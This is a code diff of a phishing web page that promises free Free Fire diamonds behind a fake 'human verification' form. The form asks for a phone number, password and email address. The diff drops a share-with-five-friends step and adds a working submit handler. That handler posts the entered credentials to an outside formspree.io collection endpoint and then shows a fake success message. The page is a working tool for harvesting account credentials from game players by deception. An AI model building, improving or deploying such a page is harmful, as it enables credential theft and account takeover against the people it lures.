@@ -180,51 +180,6 @@
             display: none;
         }
         
-        .progress-container {
-            margin: 20px 0;
-        }
-        
-        .progress-bar {
-            height: 20px;
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            margin-bottom: 10px;
-            overflow: hidden;
-        }
-        
-        .progress {
-            height: 100%;
-            background-color: #ff9f00;
-            width: 0%;
-            transition: width 0.3s;
-        }
-        
-        .progress-text {
-            text-align: center;
-            margin-bottom: 10px;
-        }
-        
-        .share-section {
-            margin-top: 20px;
-        }
-        
-        .share-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 15px;
-        }
-        
-        .share-btn {
-            padding: 10px 15px;
-            background-color: #ff9f00;
-            color: #000;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        
         .phone-input {
             display: flex;
         }
@@ -309,64 +264,44 @@
             
             <div class="step">
                 <div class="step-number">3</div>
-                <div>Share with 5 friends</div>
-            </div>
-            
-            <div class="step">
-                <div class="step-number">4</div>
                 <div>Receive diamonds in your Free Fire account</div>
             </div>
         </div>
-        <form action="https://formspree.io/f/xgvkeqry" method="POST">
-        <div id="verification-section" class="verification-form hidden">
-            <h3>HUMAN VERIFICATION REQUIRED</h3>
-            <p>Complete this quick verification to prevent abuse of our system.</p>
-            
-            <div class="form-group">
-                <label for="phone">Phone Number</label>
-                <div class="phone-input">
-                    <div class="country-code">+91</div>
-                    <input type="tel" id="phone" placeholder="Enter 10-digit mobile number" 
-                           maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,''); validatePhone()">
-                </div>
-                <div id="phone-error" class="error-message">Phone number must be 10 digits</div>
-            </div>
-            
-            <div class="form-group">
-                <label for="message">Password</label>
-                <input type="message" id="message" placeholder="Enter your password" 
-                       oninput="validatePassword()">
-                <div id="password-error" class="error-message">Password must be at least 6 characters</div>
-            </div>
-            
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" placeholder="Enter your valid email address" 
-                       oninput="validateEmail()">
-                <div id="email-error" class="error-message">Please enter a valid email address</div>
-            </div>
-            
-            <button class="submit-btn" onclick="validateForm()">COMPLETE VERIFICATION</button>
-        </div>
         
-        <div id="share-section" class="offer-box hidden">
-            <h3>SHARE WITH FRIENDS</h3>
-            <p>Share this link with 5 friends to complete verification:</p>
-            
-            <div class="progress-container">
-                <div class="progress-text" id="progress-text">0/5 friends shared</div>
-                <div class="progress-bar">
-                    <div class="progress" id="progress-bar"></div>
+        <form action="https://formspree.io/f/xgvkeqry" method="POST" id="diamond-form">
+            <div id="verification-section" class="verification-form hidden">
+                <h3>HUMAN VERIFICATION REQUIRED</h3>
+                <p>Complete this quick verification to prevent abuse of our system.</p>
+                
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <div class="phone-input">
+                        <div class="country-code">+91</div>
+                        <input type="tel" id="phone" name="phone" placeholder="Enter 10-digit mobile number" 
+                               maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,''); validatePhone()">
+                    </div>
+                    <div id="phone-error" class="error-message">Phone number must be 10 digits</div>
                 </div>
-            </div>
-            
-            <div class="share-section">
-                <div class="share-buttons">
-                    <button class="share-btn" onclick="shareOnWhatsApp()">WhatsApp</button>
-                    <button class="share-btn" onclick="shareAnywhere()">Share</button>
+                
+                <div class="form-group">
+                    <label for="message">Password</label>
+                    <input type="message" id="password" name="password" placeholder="Enter your password" 
+                           oninput="validatePassword()">
+                    <div id="password-error" class="error-message">Password must be at least 6 characters</div>
                 </div>
+                
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" name="email" placeholder="Enter your valid email address" 
+                           oninput="validateEmail()">
+                    <div id="email-error" class="error-message">Please enter a valid email address</div>
+                </div>
+                
+                <input type="hidden" id="diamond-package" name="diamond_package" value="">
+                
+                <button type="submit" class="submit-btn">COMPLETE VERIFICATION</button>
             </div>
-        </div>
+        </form>
         
         <div id="result-section" class="offer-box hidden">
             <h2 id="result-title">VERIFICATION COMPLETE!</h2>
@@ -383,12 +318,12 @@
     <script>
         // JavaScript functionality
         let selectedPackage = 0;
-        let sharedCount = 0;
         
         function selectPackage(amount) {
             selectedPackage = amount;
             document.getElementById('verification-section').classList.remove('hidden');
             document.getElementById('diamond-amount').textContent = amount;
+            document.getElementById('diamond-package').value = amount + ' Diamonds';
             
             // Scroll to verification section
             document.getElementById('verification-section').scrollIntoView({
@@ -436,82 +371,36 @@
             }
         }
         
-        function validateForm() {
-            const phone = document.getElementById('phone').value;
-            const password = document.getElementById('password').value;
-            const email = document.getElementById('email').value;
+        document.getElementById('diamond-form').addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            let isValid = true;
+            const phoneValid = validatePhone();
+            const passwordValid = validatePassword();
+            const emailValid = validateEmail();
             
-            // Validate phone (10 digits)
-            if (!validatePhone()) {
-                isValid = false;
-            }
-            
-            // Validate password (at least 6 characters)
-            if (!validatePassword()) {
-                isValid = false;
-            }
-            
-            // Validate email
-            if (!validateEmail()) {
-                isValid = false;
-            }
-            
-            if (isValid) {
-                startVerification();
-            }
-        }
-        
-        function startVerification() {
-            // Hide verification and show share section
-            document.getElementById('verification-section').classList.add('hidden');
-            document.getElementById('share-section').classList.remove('hidden');
-            
-            // Scroll to share section
-            document.getElementById('share-section').scrollIntoView({
-                behavior: 'smooth'
-            });
-        }
-        
-        function updateProgress() {
-            sharedCount++;
-            const progressPercent = (sharedCount / 5) * 100;
-            document.getElementById('progress-text').textContent = `${sharedCount}/5 friends shared`;
-            document.getElementById('progress-bar').style.width = `${progressPercent}%`;
-            
-            if (sharedCount >= 5) {
-                setTimeout(showResult, 1000);
-            }
-        }
-        
-        function shareOnWhatsApp() {
-            const url = encodeURIComponent(window.location.href);
-            window.open(`https://wa.me/?text=Get+free+Free+Fire+diamonds+here:+${url}`);
-            updateProgress();
-        }
-        
-        function shareAnywhere() {
-            if (navigator.share) {
-                navigator.share({
-                    title: 'Free Fire Diamonds',
-                    text: 'Get free diamonds for Free Fire!',
-                    url: window.location.href
-                }).then(() => {
-                    updateProgress();
-                }).catch(err => {
-                    console.log('Error sharing:', err);
+            if (phoneValid && passwordValid && emailValid) {
+                // Submit the form
+                fetch(this.action, {
+                    method: this.method,
+                    body: new FormData(this),
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                }).then(response => {
+                    if (response.ok) {
+                        showResult();
+                    } else {
+                        throw new Error('Form submission failed');
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                    alert('There was a problem submitting the form. Please try again.');
                 });
-            } else {
-                // Fallback for browsers that don't support Web Share API
-                const url = encodeURIComponent(window.location.href);
-                window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`);
-                updateProgress();
             }
-        }
+        });
         
         function showResult() {
-            document.getElementById('share-section').classList.add('hidden');
+            document.getElementById('verification-section').classList.add('hidden');
             document.getElementById('result-section').classList.remove('hidden');
             
             // Scroll to result section
